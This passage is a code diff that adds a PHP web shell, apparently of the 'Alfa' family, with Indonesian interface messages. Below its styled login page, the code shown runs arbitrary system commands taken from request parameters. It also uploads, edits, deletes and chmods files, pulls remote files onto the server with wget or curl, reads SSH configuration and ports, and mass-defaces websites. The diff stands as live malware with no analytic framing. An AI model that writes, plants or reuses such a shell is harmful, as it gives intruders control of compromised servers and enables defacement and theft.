+                color: rgba(66, 165, 245, 0.2);
+            }
+
+            .form-group .input-wrapper input {
+                width: 100%;
+                padding: 10px 14px 10px 38px;
+                background: transparent;
+                border: none;
+                outline: none;
+                color: #ffffff;
+                font-size: 13px;
+                font-family: 'Poppins', sans-serif;
+                font-weight: 400;
+                letter-spacing: 0.3px;
+            }
+
+            .form-group .input-wrapper input::placeholder {
+                color: rgba(255, 255, 255, 0.06);
+                font-size: 12px;
+            }
+
+            .form-group .input-wrapper input:focus::placeholder {
+                color: rgba(255, 255, 255, 0.03);
+            }
+
+            /* ===== TOGGLE PASSWORD ===== */
+            .toggle-password {
+                position: absolute;
+                right: 12px;
+                top: 50%;
+                transform: translateY(-50%);
+                background: none;
+                border: none;
+                color: rgba(255, 255, 255, 0.06);
+                cursor: pointer;
+                font-size: 12px;
+                transition: 0.3s;
+                padding: 4px;
+            }
+
+            .toggle-password:hover {
+                color: rgba(255, 255, 255, 0.15);
+            }
+
+            /* ===== SUBMIT BUTTON ===== */
+            .btn-login {
+                width: 100%;
+                padding: 11px;
+                background: linear-gradient(135deg, rgba(66, 165, 245, 0.12), rgba(124, 77, 255, 0.12));
+                border: 1px solid rgba(66, 165, 245, 0.1);
+                border-radius: 10px;
+                color: #ffffff;
+                font-size: 13px;
+                font-weight: 600;
+                font-family: 'Poppins', sans-serif;
+                cursor: pointer;
+                transition: all 0.4s ease;
+                position: relative;
+                overflow: hidden;
+                letter-spacing: 0.8px;
+                margin-top: 4px;
+            }
+
+            .btn-login:hover {
+                background: linear-gradient(135deg, rgba(66, 165, 245, 0.2), rgba(124, 77, 255, 0.2));
+                border-color: rgba(66, 165, 245, 0.2);
+                transform: translateY(-1px);
+                box-shadow: 0 8px 30px rgba(66, 165, 245, 0.08);
+            }
+
+            .btn-login:active {
+                transform: scale(0.98);
+            }
+
+            .btn-login .btn-content {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 10px;
+            }
+
+            .btn-login .btn-content i {
+                font-size: 13px;
+                opacity: 0.4;
+                transition: 0.3s;
+            }
+
+            .btn-login:hover .btn-content i {
+                opacity: 0.7;
+            }
+
+            .btn-login .btn-arrow {
+                transition: 0.3s;
+            }
+
+            .btn-login:hover .btn-arrow {
+                transform: translateX(4px);
+                opacity: 0.7;
+            }
+
+            /* ===== LOADING SPINNER ===== */
+            .spinner {
+                display: none;
+                width: 16px;
+                height: 16px;
+                border: 2px solid rgba(255,255,255,0.05);
+                border-top: 2px solid rgba(255,255,255,0.3);
+                border-radius: 50%;
+                animation: spin 0.8s linear infinite;
+            }
+
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+
+            /* ===== FOOTER ===== */
+            .login-footer {
+                text-align: center;
+                margin-top: 22px;
+                padding-top: 16px;
+                border-top: 1px solid rgba(255, 255, 255, 0.02);
+            }
+
+            .login-footer p {
+                font-size: 9px;
+                color: rgba(255, 255, 255, 0.06);
+                letter-spacing: 1.5px;
+                font-weight: 300;
+            }
+
+            .login-footer .team {
+                color: rgba(255, 255, 255, 0.04);
+                font-size: 8px;
+                margin-top: 3px;
+                letter-spacing: 2px;
+            }
+
+            .login-footer .secure-badge {
+                display: inline-block;
+                margin-top: 6px;
+                padding: 2px 10px;
+                background: rgba(255, 255, 255, 0.02);
+                border-radius: 20px;
+                font-size: 7px;
+                color: rgba(255, 255, 255, 0.05);
+                letter-spacing: 2px;
+            }
+
+            /* ===== ERROR MESSAGE ===== */
+            .login-error {
+                background: rgba(244, 67, 54, 0.06);
+                border: 1px solid rgba(244, 67, 54, 0.08);
+                border-radius: 8px;
+                padding: 8px 14px;
+                margin-bottom: 16px;
+                color: rgba(244, 67, 54, 0.4);
+                font-size: 11px;
+                text-align: center;
+                display: none;
+                transition: 0.3s;
+            }
+
+            .login-error.show {
+                display: block;
+                animation: shake 0.5s ease;
+            }
+
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                25% { transform: translateX(-6px); }
+                75% { transform: translateX(6px); }
+            }
+
+            /* ===== STATUS DOT ===== */
+            .status-dot {
+                display: inline-block;
+                width: 4px;
+                height: 4px;
+                border-radius: 50%;
+                background: rgba(66, 165, 245, 0.2);
+                margin-right: 4px;
+                animation: dotPulse 2.5s ease-in-out infinite;
+            }
+
+            @keyframes dotPulse {
+                0%, 100% { opacity: 0.3; transform: scale(1); }
+                50% { opacity: 1; transform: scale(1.2); }
+            }
+
+            /* ===== RESPONSIVE ===== */
+            @media (max-width: 480px) {
+                .login-container {
+                    padding: 28px 22px 24px;
+                    border-radius: 16px;
+                }
+
+                .brand-title {
+                    font-size: 17px;
+                }
+
+                .brand-icon {
+                    font-size: 30px;
+                }
+
+                .form-group .input-wrapper input {
+                    padding: 9px 12px 9px 34px;
+                    font-size: 12px;
+                }
+
+                .form-group .input-wrapper .icon {
+                    font-size: 11px;
+                    left: 10px;
+                }
+
+                .btn-login {
+                    padding: 10px;
+                    font-size: 12px;
+                }
+
+                .login-wrapper {
+                    padding: 10px;
+                }
+            }
+
+            @media (max-width: 360px) {
+                .login-container {
+                    padding: 22px 18px 20px;
+                }
+
+                .brand-title {
+                    font-size: 15px;
+                }
+
+                .brand-icon {
+                    font-size: 26px;
+                    margin-bottom: 6px;
+                }
+            }
+        </style>
+    </head>
+    <body>
+        <!-- ===== BACKGROUND ===== -->
+        <div class="bg-layer"></div>
+        <div class="grid-overlay"></div>
+
+        <!-- ===== ORBS ===== -->
+        <div class="orb orb-1"></div>
+        <div class="orb orb-2"></div>
+        <div class="orb orb-3"></div>
+
+        <!-- ===== PARTICLES ===== -->
+        <div class="particles">
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+            <div class="particle"></div>
+        </div>
+
+        <!-- ===== LOGIN WRAPPER ===== -->
+        <div class="login-wrapper">
+            <div class="login-container">
+                <!-- Glass Reflection -->
+                <div class="glass-reflection"></div>
+
+                <!-- Brand -->
+                <div class="brand-header">
+                    <div class="brand-icon"><?php echo $branding['logo']; ?></div>
+                    <div class="brand-title"><?php echo $branding['name']; ?></div>
+                    <div class="brand-divider"></div>
+                    <div class="brand-sub"><?php echo $branding['team']; ?></div>
+                    <div>
+                        <span class="brand-version">
+                            <span class="status-dot"></span>
+                            <?php echo $branding['version']; ?>
+                        </span>
+                    </div>
+                </div>
+
+                <!-- Form -->
+                <form method="post" class="login-form" id="loginForm" autocomplete="off">
+                    <div class="login-error" id="loginError">
+                        <i class="fas fa-exclamation-circle"></i> Invalid credentials
+                    </div>
+
+                    <div class="form-group">
+                        <label><i class="far fa-user" style="margin-right:4px;"></i> Username</label>
+                        <div class="input-wrapper">
+                            <span class="icon"><i class="fas fa-user"></i></span>
+                            <input type="text" 
+                                   name="login_user" 
+                                   id="login_user" 
+                                   placeholder="Enter username" 
+                                   required 
+                                   autocomplete="off"
+                                   value="<?php echo isset($_POST['login_user']) ? htmlspecialchars($_POST['login_user']) : ''; ?>">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label><i class="fas fa-lock" style="margin-right:4px;"></i> Password</label>
+                        <div class="input-wrapper">
+                            <span class="icon"><i class="fas fa-key"></i></span>
+                            <input type="password" 
+                                   name="login_pass" 
+                                   id="login_pass" 
+                                   placeholder="Enter password" 
+                                   required 
+                                   autocomplete="off">
+                            <button type="button" class="toggle-password" onclick="togglePassword()">
+                                <i class="fas fa-eye" id="toggleIcon"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-login" id="loginBtn">
+                        <span class="btn-content">
+                            <i class="fas fa-sign-in-alt"></i>
+                            <span>Access</span>
+                            <i class="fas fa-arrow-right btn-arrow" style="font-size:11px;"></i>
+                        </span>
+                    </button>
+
+                    <div class="login-footer">
+                        <p>© <?php echo date('Y'); ?> <?php echo $branding['team']; ?></p>
+                        <div class="team"><?php echo $branding['icon']; ?> SECURE • ENCRYPTED</div>
+                        <div class="secure-badge">
+                            <i class="fas fa-shield-alt" style="margin-right:4px;"></i> 
+                            SSL PROTECTED
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <script>
+            // ===== TOGGLE PASSWORD =====
+            function togglePassword() {
+                var passInput = document.getElementById('login_pass');
+                var icon = document.getElementById('toggleIcon');
+                if (passInput.type === 'password') {
+                    passInput.type = 'text';
+                    icon.className = 'fas fa-eye-slash';
+                } else {
+                    passInput.type = 'password';
+                    icon.className = 'fas fa-eye';
+                }
+            }
+
+            // ===== SHOW LOGIN ERROR =====
+            <?php if (isset($_POST['login_user']) || isset($_POST['login_pass'])): ?>
+                document.addEventListener('DOMContentLoaded', function() {
+                    var error = document.getElementById('loginError');
+                    error.classList.add('show');
+                    error.innerHTML = '<i class="fas fa-exclamation-circle" style="margin-right:6px;"></i> Invalid credentials, please try again.';
+                });
+            <?php endif; ?>
+
+            // ===== AUTO FOCUS =====
+            document.addEventListener('DOMContentLoaded', function() {
+                var userInput = document.getElementById('login_user');
+                if (!userInput.value) {
+                    userInput.focus();
+                } else {
+                    document.getElementById('login_pass').focus();
+                }
+            });
+
+            // ===== ENTER KEY SUPPORT =====
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    var active = document.activeElement;
+                    if (active.tagName === 'INPUT') {
+                        document.getElementById('loginBtn').click();
+                    }
+                }
+            });
+
+            // ===== BUTTON LOADING STATE =====
+            document.getElementById('loginForm').addEventListener('submit', function() {
+                var btn = document.getElementById('loginBtn');
+                btn.innerHTML = '<span class="spinner" style="display:inline-block;"></span> Processing...';
+                btn.disabled = true;
+            });
+        </script>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ============================================================
+// MAIN APPLICATION
+// ============================================================
+
+requireLogin();
+
+// Get current path
+$current_path = isset($_GET['path']) ? $_GET['path'] : __DIR__;
+$current_path = realpath($current_path);
+if (!$current_path || !is_dir($current_path)) $current_path = __DIR__;
+
+// Handle AJAX requests
+if (isset($_GET['ajax'])) {
+    $action = $_GET['ajax'];
+    
+    if ($action == 'command' && isset($_GET['cmd'])) {
+        $cmd = $_GET['cmd'];
+        $output = alfaEx($cmd, true);
+        echo $output;
+        exit;
+    }
+    
+    if ($action == 'ssh_detect') {
+        echo nl2br(sshDetector());
+        exit;
+    }
+    
+    if ($action == 'ssh_config') {
+        echo nl2br(readSSHConfig());
+        exit;
+    }
+    
+    if ($action == 'ssh_port') {
+        echo nl2br(quickSSHPort());
+        exit;
+    }
+    
+    if ($action == 'log_view' && isset($_GET['path'])) {
+        $log_path = $_GET['path'];
+        $lines = isset($_GET['lines']) ? intval($_GET['lines']) : 100;
+        $filter = isset($_GET['filter']) ? $_GET['filter'] : '';
+        echo nl2br(readDomainLog($log_path, $lines, $filter));
+        exit;
+    }
+    
+    if ($action == 'log_aggregate') {
+        $lines = isset($_GET['lines']) ? intval($_GET['lines']) : 50;
+        $logs = aggregateLogs($lines);
+        $output = [];
+        $output[] = "📋 AGGREGATED LOGS (All Domains)";
+        $output[] = "===================================";
+        $output[] = "Total entries: " . count($logs);
+        $output[] = "";
+        foreach ($logs as $log) {
+            $output[] = "[" . $log['domain'] . "] " . $log['line'];
+        }
+        echo nl2br(implode("\n", $output));
+        exit;
+    }
+    
+    if ($action == 'log_monitor') {
+        $minutes = isset($_GET['minutes']) ? intval($_GET['minutes']) : 10;
+        $changes = monitorFileChanges($minutes);
+        $output = [];
+        $output[] = "🔍 FILE CHANGES (Last " . $minutes . " minutes)";
+        $output[] = "=============================================";
+        $output[] = "Total changes: " . count($changes);
+        $output[] = "";
+        if (empty($changes)) {
+            $output[] = "✅ No file changes detected";
+        } else {
+            foreach ($changes as $change) {
+                $output[] = "📄 " . $change['domain'] . "/" . $change['name'];
+                $output[] = "   📂 " . $change['path'];
+                $output[] = "   🕐 " . $change['modified'];
+                $output[] = "   📊 " . formatSize($change['size']);
+                $output[] = "";
+            }
+        }
+        echo nl2br(implode("\n", $output));
+        exit;
+    }
+}
+
+// Handle POST actions
+$message = '';
+$mass_results = [];
+$cmd_output = '';
+$extract_result = '';
+$zip_result = '';
+$ssh_output = '';
+$chmod_results = [];
+$download_result = '';
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    // Upload file
+    if (isset($_FILES['upload_file'])) {
+        $target = $current_path . '/' . basename($_FILES['upload_file']['name']);
+        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
+            $message = "✅ Upload berhasil!";
+            logActivityMulti("Uploaded file: " . $target, $current_path);
+        } else {
+            $message = "❌ Upload gagal!";
+        }
+    }
+    
+    // Create folder
+    if (isset($_POST['create_folder'])) {
+        $full_path = realpath($current_path) . '/' . trim($_POST['folder_name']);
+        if (mkdir($full_path, 0755)) {
+            $message = "✅ Folder berhasil dibuat!";
+            logActivityMulti("Created folder: " . $full_path, $current_path);
+        } else {
+            $message = "❌ Gagal membuat folder!";
+        }
+    }
+    
+    // Delete
+    if (isset($_POST['delete_item'])) {
+        $full_path = $current_path . '/' . $_POST['delete_item'];
+        if (deleteItem($full_path)) {
+            $message = "✅ Berhasil dihapus!";
+            logActivityMulti("Deleted: " . $full_path, $current_path);
+        } else {
+            $message = "❌ Gagal menghapus!";
+        }
+    }
+    
+    // Rename
+    if (isset($_POST['rename_item'])) {
+        $old_path = $current_path . '/' . $_POST['old_name'];
+        $new_path = dirname($old_path) . '/' . $_POST['new_name'];
+        if (rename($old_path, $new_path)) {
+            $message = "✅ Berhasil diubah!";
+            logActivityMulti("Renamed: " . $old_path . " → " . $new_path, $current_path);
+        } else {
+            $message = "❌ Gagal mengubah!";
+        }
+    }
+    
+    // Edit file
+    if (isset($_POST['edit_file'])) {
+        $file_path = $current_path . '/' . $_POST['file_path'];
+        if (file_put_contents($file_path, $_POST['file_content']) !== false) {
+            $message = "✅ File berhasil diupdate!";
+            logActivityMulti("Edited file: " . $file_path, $current_path);
+        } else {
+            $message = "❌ Gagal mengupdate file!";
+        }
+    }
+    
+    // ========== WGET ==========
+    if (isset($_POST['wget_download'])) {
+        $url = $_POST['wget_url'];
+        $filename = !empty($_POST['wget_filename']) ? $_POST['wget_filename'] : basename(parse_url($url, PHP_URL_PATH));
+        if (empty($filename) || $filename == '/' || $filename == '') {
+            $filename = 'downloaded_' . time() . '.file';
+        }
+        
+        $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
+        $target = $current_path . '/' . $filename;
+        
+        $content = false;
+        
+        // Method 1: PHP file_get_contents
+        if (ini_get('allow_url_fopen')) {
+            $content = @file_get_contents($url);
+        }
+        
+        // Method 2: cURL
+        if ($content === false && function_exists('curl_init')) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+            $content = curl_exec($ch);
+            curl_close($ch);
+        }
+        
+        if ($content !== false && !empty($content)) {
+            if (file_put_contents($target, $content)) {
+                $file_size = formatSize(filesize($target));
+                $message = "✅ Download berhasil!\n📁 File: " . $filename . "\n📊 Size: " . $file_size . "\n📂 Path: " . $target;
+                logActivityMulti("wget: " . $url . " → " . $filename . " (" . $file_size . ")", $current_path);
+            } else {
+                $message = "❌ Gagal menyimpan file: " . $filename . " (permission denied)";
+            }
+        } else {
+            // Method 3: Command line wget/curl
+            $cmd = "wget -O '" . addslashes($target) . "' '" . addslashes($url) . "' 2>&1";
+            $output = alfaEx($cmd);
+            if (file_exists($target) && filesize($target) > 0) {
+                $file_size = formatSize(filesize($target));
+                $message = "✅ Download berhasil (via command)!\n📁 File: " . $filename . "\n📊 Size: " . $file_size;
+                logActivityMulti("wget (cmd): " . $url . " → " . $filename . " (" . $file_size . ")", $current_path);
+            } else {
+                $message = "❌ Gagal download:\n" . $output . "\n\n💡 Tips:\n- Pastikan URL valid\n- Coba dengan curl: curl -o " . $filename . " " . $url;
+            }
+        }
+        
+        // Redirect untuk clear form
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current_path) . '&msg=' . urlencode($message));
+        exit;
+    }
+    
+    // ========== UNZIP ==========
+    if (isset($_POST['unzip_file'])) {
+        $file = $_POST['unzip_path'];
+        $target = !empty($_POST['unzip_target']) ? $_POST['unzip_target'] : '';
+        $full_file = $current_path . '/' . $file;
+        
+        if (!file_exists($full_file)) {
+            $message = "❌ File tidak ditemukan: " . $file;
+        } else {
+            $result = extract_file($full_file, $target);
+            if ($result['status']) {
+                $message = "✅ " . $result['message'];
+                logActivityMulti("unzip: " . $file . " → " . ($target ?: dirname($full_file) . '/' . pathinfo($file, PATHINFO_FILENAME)), $current_path);
+            } else {
+                $message = "❌ " . $result['message'];
+            }
+        }
+        
+        // Redirect untuk clear form
+        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current_path) . '&msg=' . urlencode($message));
+        exit;
+    }
+    
+    // CHMOD Single
+    if (isset($_POST['chmod_single'])) {
+        $path = $current_path . '/' . $_POST['chmod_path'];
+        $permission = $_POST['chmod_perm'];
+        $result = chmodSingle($path, $permission);
+        $message = $result['message'];
+    }
+    
+    // CHMOD Mass
+    if (isset($_POST['chmod_mass'])) {
+        $target_dir = !empty($_POST['chmod_dir']) ? $_POST['chmod_dir'] : $current_path;
+        $file_perm = $_POST['chmod_file_perm'];
+        $dir_perm = $_POST['chmod_dir_perm'];
+        $result = chmodMass($target_dir, $file_perm, $dir_perm, true);
+        $message = $result['message'];
+        $chmod_results = $result['errors'];
+        logActivityMulti("Mass CHMOD: " . $target_dir, $target_dir);
+    }
+    
+    // CHMOD by Pattern
+    if (isset($_POST['chmod_pattern'])) {
+        $target_dir = !empty($_POST['chmod_pattern_dir']) ? $_POST['chmod_pattern_dir'] : $current_path;
+        $pattern = $_POST['chmod_pattern'];
+        $permission = $_POST['chmod_pattern_perm'];
+        $result = chmodByPattern($target_dir, $pattern, $permission);
+        $message = $result['message'];
+        $chmod_results = $result['errors'];
+        logActivityMulti("CHMOD by Pattern: " . $target_dir . " (" . $pattern . ")", $target_dir);
+    }
+    
+    // SSH Config Reader
+    if (isset($_POST['ssh_config_read'])) {
+        $config_path = !empty($_POST['config_path']) ? $_POST['config_path'] : null;
+        $ssh_output = readSSHConfig($config_path);
+        logActivityMulti("SSH Config Read");
+    }
+    
+    // SSH Detector
+    if (isset($_POST['ssh_detect'])) {
+        $ssh_output = sshDetector();
+        logActivityMulti("SSH Detector");
+    }
+    
+    // SSH Quick Port
+    if (isset($_POST['ssh_quick_port'])) {
+        $ssh_output = quickSSHPort();
+        logActivityMulti("SSH Quick Port");
+    }
+    
+    // Alfa Command
+    if (isset($_POST['alfa_cmd'])) {
+        $cmd = $_POST['alfa_cmd'];
+        $cmd_output = alfaEx($cmd, true);
+        logActivityMulti("Alfa Command: " . $cmd, $current_path);
+    }
+    
+    // Extract
+    if (isset($_POST['alfa_extract'])) {
+        $file = $_POST['extract_file'];
+        $target = !empty($_POST['extract_target']) ? $_POST['extract_target'] : dirname($file);
+        $result = extract_file($file, $target);
+        $extract_result = $result['message'];
+        logActivityMulti("Extract: " . $file . " → " . $target, $target);
+    }
+    
+    // Zip
+    if (isset($_POST['alfa_zip'])) {
+        $source = $_POST['zip_source'];
+        $dest = $_POST['zip_dest'];
+        $result = zip_file($source, $dest);
+        $zip_result = $result['message'];
+        logActivityMulti("Zip: " . $source . " → " . $dest, dirname($dest));
+    }
+    
+    // Mass Deface
+    if (isset($_POST['mass_deface'])) {
+        $target_dir = !empty($_POST['target_dir']) ? $_POST['target_dir'] : $current_path;
+        $filename = $_POST['filename'];
+        $content = $_POST['content'];
+        $method = $_POST['tipe'];
+        $result = mass_deface($target_dir, $filename, $content, $method);
+        if ($result['status']) {
+            $mass_results = [$result['message']];
+            $message = "✅ Mass Deface selesai! Total: " . $result['files'] . " file.";
+            logActivityMulti("Mass Deface: " . $result['files'] . " files in " . $target_dir, $target_dir);
+        } else {
+            $message = "❌ " . $result['message'];
+        }
+    }
+}
+
+// Tampilkan pesan dari redirect
+if (isset($_GET['msg'])) {
+    $message = urldecode($_GET['msg']);
+}
+
+// Get directory content
+function getDirectoryContent($path) {
+    $items = [];
+    $full_path = realpath($path);
+    if (!is_dir($full_path)) return false;
+    $files = scandir($full_path);
+    foreach ($files as $file) {
+        if ($file == '.' || $file == '..') continue;
+        $file_path = $full_path . '/' . $file;
+        $is_dir = is_dir($file_path);
+        $permissions = substr(sprintf('%o', fileperms($file_path)), -4);
+        $is_root = ($permissions == '777' || $permissions == '666');
+        
+        $items[] = [
+            'name' => $file,
+            'path' => $file_path,
+            'is_dir' => $is_dir,
+            'is_root' => $is_root,
+            'size' => is_file($file_path) ? filesize($file_path) : 0,
+            'modified' => filemtime($file_path),
+            'permissions' => $permissions
+        ];
+    }
+    usort($items, function($a, $b) {
+        if ($a['is_dir'] == $b['is_dir']) return strcasecmp($a['name'], $b['name']);
+        return $a['is_dir'] ? -1 : 1;
+    });
+    return $items;
+}
+
+function formatSize($bytes) {
+    if ($bytes == 0) return '0 B';
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $i = floor(log($bytes, 1024));
+    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
+}
+
+function deleteItem($path) {
+    $full_path = realpath($path);
+    if ($full_path == __DIR__) return false;
+    if (!file_exists($full_path)) return false;
+    if (is_dir($full_path)) {
+        $files = array_diff(scandir($full_path), ['.', '..']);
+        foreach ($files as $file) deleteItem($full_path . '/' . $file);
+        return rmdir($full_path);
+    } else {
+        return unlink($full_path);
+    }
+}
+
+$items = getDirectoryContent($current_path);
+$parent_dir = dirname($current_path);
+
+$breadcrumbs = [];
+$temp = $current_path;
+while ($temp != dirname($temp)) {
+    $breadcrumbs[] = ['name' => basename($temp), 'path' => $temp];
+    $temp = dirname($temp);
+}
+$breadcrumbs = array_reverse($breadcrumbs);
+
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><?php echo $branding['name']; ?> - Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #0a0e1a;
+            color: #e0e4f0;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: rgba(255,255,255,0.02); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: rgba(66, 165, 245, 0.3); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(66, 165, 245, 0.5); }
+        
+        .container {
+            max-width: 1440px;
+            margin: 0 auto;
+            background: rgba(20, 28, 58, 0.7);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, rgba(26, 35, 126, 0.4), rgba(13, 71, 161, 0.2));
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .header-logo { font-size: 28px; background: linear-gradient(135deg, #42a5f5, #7c4dff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .header-title { font-size: 20px; font-weight: 700; color: #ffffff; letter-spacing: 1px; }
+        .header-title span { background: linear-gradient(135deg, #42a5f5, #7c4dff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .header-badge { display: inline-block; padding: 2px 12px; background: rgba(66, 165, 245, 0.15); border: 1px solid rgba(66, 165, 245, 0.15); border-radius: 20px; font-size: 9px; color: rgba(255, 255, 255, 0.3); letter-spacing: 1px; margin-left: 8px; }
+        .header-right { display: flex; align-items: center; gap: 15px; font-size: 13px; color: rgba(255, 255, 255, 0.4); }
+        .header-right .user-info { display: flex; align-items: center; gap: 8px; }
+        .header-right .user-info .avatar { width: 30px; height: 30px; border-radius: 50%; background: linear-gradient(135deg, #42a5f5, #7c4dff); display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 600; color: #fff; }
+        .header-right a { color: rgba(255, 255, 255, 0.3); text-decoration: none; transition: 0.3s; font-size: 13px; }
+        .header-right a:hover { color: rgba(255, 255, 255, 0.6); }
+        
+        .tabs {
+            display: flex;
+            background: rgba(0, 0, 0, 0.2);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            flex-wrap: wrap;
+            padding: 0 10px;
+            gap: 2px;
+        }
+        .tab {
+            padding: 12px 20px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: 0.3s;
+            font-size: 12px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.3);
+            letter-spacing: 0.5px;
+            border-radius: 8px 8px 0 0;
+        }
+        .tab:hover { color: rgba(255, 255, 255, 0.6); background: rgba(255, 255, 255, 0.02); }
+        .tab.active { color: #42a5f5; border-bottom-color: #42a5f5; background: rgba(66, 165, 245, 0.05); }
+        .tab i { margin-right: 6px; font-size: 12px; }
+        
+        .tab-content { display: none; padding: 25px 30px; }
+        .tab-content.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .tab-content h3 { font-size: 18px; font-weight: 600; color: #ffffff; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .tab-content h3 span { font-size: 12px; font-weight: 400; color: rgba(255, 255, 255, 0.2); }
+        
+        .toolbar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 15px 20px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+        .toolbar form { display: inline-flex; gap: 5px; align-items: center; flex-wrap: wrap; }
+        .toolbar input[type="text"], .toolbar input[type="file"], .toolbar select {
+            padding: 8px 14px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 8px;
+            color: #e0e4f0;
+            font-size: 13px;
+            font-family: 'Poppins', sans-serif;
+            transition: 0.3s;
+        }
+        .toolbar input[type="text"]:focus, .toolbar select:focus {
+            border-color: rgba(66, 165, 245, 0.3);
+            outline: none;
+            background: rgba(255, 255, 255, 0.06);
+        }
+        .toolbar input[type="text"]::placeholder { color: rgba(255, 255, 255, 0.15); }
+        
+        .btn {
+            padding: 8px 18px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            font-family: 'Poppins', sans-serif;
+            transition: 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .btn-primary { background: rgba(66, 165, 245, 0.2); color: #42a5f5; border: 1px solid rgba(66, 165, 245, 0.15); }
+        .btn-primary:hover { background: rgba(66, 165, 245, 0.3); border-color: rgba(66, 165, 245, 0.3); transform: translateY(-1px); }
+        .btn-success { background: rgba(76, 175, 80, 0.2); color: #66bb6a; border: 1px solid rgba(76, 175, 80, 0.15); }
+        .btn-success:hover { background: rgba(76, 175, 80, 0.3); border-color: rgba(76, 175, 80, 0.3); }
+        .btn-danger { background: rgba(244, 67, 54, 0.2); color: #ef5350; border: 1px solid rgba(244, 67, 54, 0.15); }
+        .btn-danger:hover { background: rgba(244, 67, 54, 0.3); border-color: rgba(244, 67, 54, 0.3); }
+        .btn-warning { background: rgba(255, 152, 0, 0.2); color: #ffa726; border: 1px solid rgba(255, 152, 0, 0.15); }
+        .btn-warning:hover { background: rgba(255, 152, 0, 0.3); border-color: rgba(255, 152, 0, 0.3); }
+        .btn-purple { background: rgba(124, 77, 255, 0.2); color: #9f7aea; border: 1px solid rgba(124, 77, 255, 0.15); }
+        .btn-purple:hover { background: rgba(124, 77, 255, 0.3); border-color: rgba(124, 77, 255, 0.3); }
+        .btn-cyan { background: rgba(0, 229, 255, 0.15); color: #4dd0e1; border: 1px solid rgba(0, 229, 255, 0.15); }
+        .btn-cyan:hover { background: rgba(0, 229, 255, 0.25); border-color: rgba(0, 229, 255, 0.25); }
+        
+        .breadcrumb {
+            padding: 12px 0;
+            font-size: 14px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            margin-bottom: 15px;
+        }
+        .breadcrumb a { color: #42a5f5; text-decoration: none; }
+        .breadcrumb a:hover { text-decoration: underline; }
+        .breadcrumb .separator { margin: 0 8px; color: rgba(255, 255, 255, 0.15); }
+        
+        .message {
+            padding: 12px 20px;
+            margin: 10px 0;
+            border-radius: 10px;
+            white-space: pre-wrap;
+            font-size: 13px;
+        }
+        .message.success { background: rgba(76, 175, 80, 0.1); color: #66bb6a; border: 1px solid rgba(76, 175, 80, 0.15); }
